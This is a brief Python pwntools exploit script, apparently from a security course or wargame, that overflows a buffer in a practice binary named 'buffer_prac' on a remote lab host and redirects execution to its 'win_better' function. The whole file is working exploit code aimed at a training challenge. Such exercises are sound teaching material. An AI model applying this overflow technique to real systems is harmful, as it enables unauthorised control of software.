#!/usr/bin/python3

# ELF()
#  .symbols[]

from pwn import *

elf = ELF("./buffer_prac")

p = remote("comp6447.wtf", 26940) # p = process("./buffer_prac")
p.sendline("0")         # Sends an invalid answer (Prevents accidental pass case)
p.recvuntil("y\\n")

payload = b''
payload += b'A' * 0x16                    # Add buffer content
payload += p32(elf.symbols["win_better"]) # win_better function
# payload += p32(0x08048626) # win_better function

p.sendline(payload)
p.interactive() # pwn

